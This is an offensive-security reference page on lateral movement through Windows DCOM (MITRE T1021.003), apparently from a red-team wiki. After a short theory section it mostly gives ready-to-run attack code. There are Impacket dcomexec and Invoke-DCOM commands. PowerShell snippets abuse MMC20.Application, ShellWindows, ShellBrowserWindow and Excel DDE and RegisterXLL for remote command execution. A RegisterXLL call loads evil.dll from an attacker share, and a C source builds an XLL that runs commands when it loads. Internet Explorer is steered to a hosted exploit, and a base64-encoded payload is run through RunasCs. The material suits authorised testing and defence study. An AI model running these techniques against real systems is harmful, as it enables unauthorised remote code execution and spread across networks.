---
description: >-
  MITRE ATT&CK™ Remote Services: Distributed Component Object Model - Technique
  T1021.003
---

# DCOM

## Theory

**DCOM** (Distributed Component Object Model) objects are **interesting** due to the ability to **interact** with the objects **over the network**. Microsoft has some good documentation on DCOM [here](https://msdn.microsoft.com/en-us/library/cc226801.aspx) and on COM [here](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). You can find a solid list of DCOM applications using PowerShell, by running `Get-CimInstance Win32_DCOMApplication`.

**DCOM** (Distributed Component Object Model) Remote Protocol, exposes application objects (COM) via remote procedure calls (RPCs) and consists of a set of extensions layered on the Microsoft Remote Procedure Call Extensions.

The Windows Registry contains the DCOM configuration data in 3 identifiers:

* **CLSID** – The Class Identifier (CLSID) is a Global Unique Identifier (GUID). Windows stores a CLSID for each installed class in a program. When you need to run a class, you need the correct CLSID, so Windows knows where to go and find the program.
* **PROGID** – The Programmatic Identifier (PROGID) is an optional identifier a programmer can substitute for the more complicated and strict CLSID. PROGIDs are usually easier to read and understand. However there are no restrictions on how many PROGIDs can have the same name, which causes issues on occasion.
* **APPID** – The Application Identifier (APPID) identifies all of the classes that are part of the same executable and the permissions required to access it. DCOM cannot work if the APPID isn’t correct.

To make a COM object accessible by DCOM, an AppID must be associated with the CLSID of the class and appropriate permissions need to be given to the AppID. A COM object without an associated AppID cannot be directly accessed from a remote machine. A basic DCOM transaction looks like this:

1. The client computer requests the remote computer to create an object by its CLSID or PROGID. If the client passes the APPID, the remote computer looks up the CLSID using the PROGID.
2. The remote machine checks the APPID and verifies the client has permissions to create the object.
3. DCOMLaunch.exe (if an EXE) or DLLHOST.exe (if a DLL) will create an instance of the class the client computer requested.
4. Communication is successful!
5. The Client can now access all functions in the class on the remote computer.

{% hint style="info" %}
We can leverage some functions exposed by **MMC20.Application**, **ShellWindows** and **ShellBrowserWindow** and others COM objects to execute arbitrary code on remote targets.
{% endhint %}

## Practice

### Tools

{% tabs %}
{% tab title="UNIX-like" %}
Impacket's [**dcomexec.py**](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py) scriot can be use to spawn a semi-interactive shell. It can leverage **MMC20.Application**, **ShellWindows** and **ShellBrowserWindow** objects.

```bash
#semi-interactive shell
dcomexec.py domain/user:password@IP <command>

#SilentCommand, mor likely to bypass security solutions
dcomexec.py -silentcommand domain/user:password@IP <command>

#semi-interactive shell using ShellWindows object
# -object [{ShellWindows,ShellBrowserWindow,MMC20}]
dcomexec.py -object ShellWindows domain/user:password@IP <command>

#semi-interactive shell with powershell command processor
dcomexec.py -shell-type powershell domain/user:password@IP <command> 
```
{% endtab %}

{% tab title="Windows - Powershell" %}
The Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) allows to easily invoke various DCOM methods to execute code on remote targets.

```powershell
#Execute code using MMC20.Application object
Invoke-DCOM -ComputerName '<IP>' -Method MMC20.Application -Command "calc.exe"

#Execute code using ExcelDDE object
Invoke-DCOM -ComputerName '<IP>' -Method ExcelDDE -Command "calc.exe"

#Execute dll using RegisterXLL
Invoke-DCOM -ComputerName '<IP>' -Method RegisterXLL -DllPath "C:\Windows\system32\evil.dll"

#Start a service
Invoke-DCOM -ComputerName '<IP>' -Method ServiceStart "MyService"
```
{% endtab %}
{% endtabs %}

### IDispatch **WaaSRemediation**

This technique allows loading and executing a .NET assembly in a remote computer's WaaS Medic Service svchost.exe process for DCOM lateral movement.

{% content-ref url="../weapon/code-and-process-injection/remote-.net-assembly-loading-through-waasremediation-dcom-abuse.md" %}
[remote-.net-assembly-loading-through-waasremediation-dcom-abuse.md](../weapon/code-and-process-injection/remote-.net-assembly-loading-through-waasremediation-dcom-abuse.md)
{% endcontent-ref %}

### MMC20.Application

The [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) COM object allows you to script components of MMC snap-in operations. The`ExecuteShellCommand`  method under Document.ActiveView can be abuse to execute arbitrary commands on a remote target.

{% tabs %}
{% tab title="Windows - Powershell" %}
MMC20.Application CLSID is `{49B2791A-B1AE-4C90-9B8E-E860BA07F889}`.

As an administrator we can remotely interact with this COM through MS-DCOM protocol using `GetTypeFromProgID`.

```powershell
#Connect to the target
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP>"))

#Execute commands
$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\cmd.exe",$null,"/c hostname > c:\pwned.txt","7")
```
{% endtab %}
{% endtabs %}

### ShellWindows

The [ShellWindows](https://learn.microsoft.com/en-us/windows/win32/shell/shellwindows?redirectedfrom=MSDN) COM object is used to control and execute Shell commands, and to obtain other Shell-related objects. This COM object is using the "Document.Application" property and you we call the `ShellExecute` method on the object returned by the "Document.Application.Parent" property to execute code on a remote target.

{% tabs %}
{% tab title="Windows - Powershell" %}
ShellWindows CLSID is `{9BA05972-F6A8-11CF-A442-00A0C90A8F39}`

Since there is no [ProgID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms688254\(v=vs.85\).aspx) associated with this object, we can use the [Type.GetTypeFromCLSID](https://msdn.microsoft.com/en-us/library/system.type.gettypefromclsid\(v=vs.110\).aspx) .NET method paired with the[ Activator.CreateInstance](https://msdn.microsoft.com/en-us/library/system.activator.createinstance\(v=vs.110\).aspx) method to instantiate the object via its AppID on a remote host.

```powershell
#Connect to the target
$com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "<IP>")
$obj = [System.Activator]::CreateInstance($com)

#Execute commands
$obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
{% endtab %}
{% endtabs %}

### ShellBrowserWindow

The ShellBrowserWindow object provide an interface into the Explorer window. This COM object is using the “Document.Application” property and you we call the `ShellExecute` method on the object returned by the “Document.Application.Parent” property to execute code on a remote target.

{% hint style="info" %}
This particular object does not exist on Windows 7, making its use for lateral movement a bit more limited than the “ShellWindows” object
{% endhint %}

{% tabs %}
{% tab title="Windows - Powershell" %}
ShellBrowserWindow CLSID is `{C08AFD90-F2A1-11D1-8455-00A0C91F3880}`

```powershell
#Connect to the target
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "<IP>")
$obj = [System.Activator]::CreateInstance($com)

#Execute commands
$obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\system32", $null, 0)
```
{% endtab %}
{% endtabs %}

### Excel.Application (Excel DDE)

**DDE**, or **Dynamic Data Exchange**, is a legacy interprocess communication mechanism implemented in some Windows applications. Making Excel (or other MS Office applications) evaluate an expression ("_=cmd|' /C calc'!A0_", for example) that requires data to be transmitted via DDE from another application. It allows an attacker to specify an arbitrary command line as the DDE server to be run.

The `DDEInitiate` method exposed by the Excel.Application COM object can be use to execute code on a remote target.

{% tabs %}
{% tab title="Windows - Powershell" %}
The method appends ".exe" to the App parameter, so we need to remove the extension

```powershell
#Connect to the target
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","<IP>"))
$com.DisplayAlerts = $false

#Execute commands
$com.DDEInitiate("cmd", "/c calc.exe")
```
{% endtab %}
{% endtabs %}

### Excel.Application (RegisterXLL)

The `RegisterXLL` method exposed by the Excel.Application COM object can be use to load and execute a DLL on a remote target. The RegisterXLL function expects an [XLL add-in](https://learn.microsoft.com/en-us/office/client-developer/excel/developing-excel-xlls?redirectedfrom=MSDN) which is essentially a specially crafted DLL.

{% tabs %}
{% tab title="Windows - Powershell" %}
We can use following commands to execute a DLL or XLL file

```powershell
#Connect to the target
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","<IP>"))

#Register DLL
$com.Application.RegisterXLL("C:\Windows\evil.dll")
#OR
$com.Application.RegisterXLL("\\<ATTACKING_IP>\Share\evil.dll")
```
{% endtab %}

{% tab title="XLL Code source" %}
We can use the following code to create a XLL file

```c
// Compile with: cl.exe notepadXLL.c /LD /o notepad.xll
#include <Windows.h>
__declspec(dllexport) void __cdecl xlAutoOpen(void); 
void __cdecl xlAutoOpen() {
    // Triggers when Excel opens
    WinExec("cmd.exe /c notepad.exe", 1);
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```
{% endtab %}
{% endtabs %}

### Internetexplorer.Application

One of the interesting techniques discovered by homjxi0e, you can open internet Explorer browser on remote machines by using navigate methods which you can use it get command execution by browser exploits.

{% tabs %}
{% tab title="Windows - Powershell" %}
```powershell
#Connect to the target
$com = [Activator]::CreateInstance([type]::GetTypeFromProgID("InternetExplorer.Application","<IP>"))
$com.Visible = $true

#Browse to hosted exploit
$com.Navigate("http://192.168.100.1/exploit")
```
{% endtab %}
{% endtabs %}

### Passing credentials - non-interactive shell

DCOM objects **runs under current user session** which can be a problem if we have a non-interactive shell and we want to run it under higher privileged user. A quick solution is to use [RunAsCs](https://github.com/antonioCoco/RunasCs), an implementation of RunAs by antonioCoco in C# , which we can integrate  with our chosen DCOM object to pass credentials in non-interactive shell (note this will be a better choice than invoke-command since it uses [WinRM](../../network/protocols/winrm.md))

{% tabs %}
{% tab title="Windows - Powershell" %}
First we need to encode our chosen DCOM object using base64 i.e.:

```powershell
#Base64 payload encode
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$hb = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.126.134"));$hb.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c echo Haboob > C:\hb.txt","7")'))

```

Then we can call invoke-RunasCs function using the following command

```powershell
#RunAsCs with encoded payload
Invoke-RunasCs -Domain test -Username administrator -Password P@ssw0rd -Command "powershell -e JABoAGIAIAA9ACAAWwBhAGMAdABpAHYAYQB0AG8AcgBdADoAOgBDAHIAZQBhAHQAZQBJAG4AcwB0AGEAbgBjAGUAKABbAHQAeQBwAGUAXQA6ADoARwBlAHQAVAB5AHAAZQBGAHIAbwBtAFAAcgBvAGcASQBEACgAIgBNAE0AQwAyADAALgBBAHAAcABsAGkAYwBhAHQAaQBvAG4AIgAsACIAMQA5ADIALgAxADYAOAAuADEAMgA2AC4AMQAzADQAIgApACkAOwAkAGgAYgAuAEQAbwBjAHUAbQBlAG4AdAAuAEEAYwB0AGkAdgBlAFYAaQBlAHcALgBFAHgAZQBjAHUAdABlAFMAaABlAGwAbABDAG8AbQBtAGEAbgBkACgAIgBjAG0AZAAiACwAJABuAHUAbABsACwAIgAvAGMAIABlAGMAaABvACAASABhAGIAbwBvAGIAIAA+ACAAQwA6AFwAaABiAC4AdAB4AHQAIgAsACIANwAiACkA"
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom" %}

{% embed url="https://www.exploit-db.com/exploits/48767" %}

{% embed url="https://www.ired.team/offensive-security/lateral-movement/t1175-distributed-component-object-model" %}

{% embed url="https://book.hacktricks.xyz/windows-hardening/lateral-movement/dcom-exec" %}
